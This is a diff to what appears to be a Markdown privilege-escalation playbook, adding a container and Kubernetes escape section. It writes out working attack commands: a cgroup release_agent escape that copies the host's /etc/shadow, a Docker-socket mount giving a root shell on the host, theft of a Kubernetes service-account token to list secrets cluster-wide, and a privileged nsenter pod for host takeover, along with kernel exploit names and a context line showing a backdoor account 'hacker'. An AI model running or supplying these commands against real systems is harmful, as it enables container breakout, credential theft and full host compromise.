@@ -146,8 +146,39 @@ su hacker   # password: hacked123
 ```bash
 uname -a; cat /etc/os-release
 searchsploit linux kernel <VERSION>
-# Common: DirtyCow (3.x-4.x), Dirty Pipe (5.8-5.16)
+# Common: DirtyCow (3.x-4.x), Dirty Pipe (5.8-5.16), nf_tables (5.14+), PwnKit/pkexec
 ```
+
+## Step 2b: Container / Kubernetes escape (am I in a container?)
+```bash
+# Detect container
+cat /proc/1/cgroup | grep -iE "docker|lxc|kube"; ls -la /.dockerenv 2>/dev/null
+cat /proc/self/status | grep CapEff        # decode caps: capsh --decode=<hex>
+```
+**Privileged container / dangerous caps (CAP_SYS_ADMIN):**
+```bash
+# cgroup release_agent escape (privileged)
+d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null|head -1)); mkdir -p /tmp/c; echo 1 > $d/c/notify_on_release
+host=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host/cmd" > $d/release_agent
+echo '#!/bin/sh' > /cmd; echo "cat /etc/shadow > $host/out" >> /cmd; chmod +x /cmd
+sh -c "echo 0 > $d/c/cgroup.procs"; cat /out
+```
+**Mounted Docker socket (`/var/run/docker.sock`):**
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
+# no docker client? use curl against the socket API to create a privileged container
+```
+**runC / CVE-2024-21626** — leaked fd lets a crafted `WORKDIR`/process cwd escape to host FS; check runc version (`runc --version`), pull the PoC if < 1.1.12.
+**Kubernetes service account:**
+```bash
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+kubectl --token=$TOKEN auth can-i --list
+kubectl --token=$TOKEN get secrets -A            # hunt creds
+kubectl --token=$TOKEN run x --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/sh"]}]}}' -it
+```
+Tools if allowed to pull: `deepce` (container enum), `CDK` (exploit toolkit), `amicontained`.
 
 ## Step 3: Output format
 ```
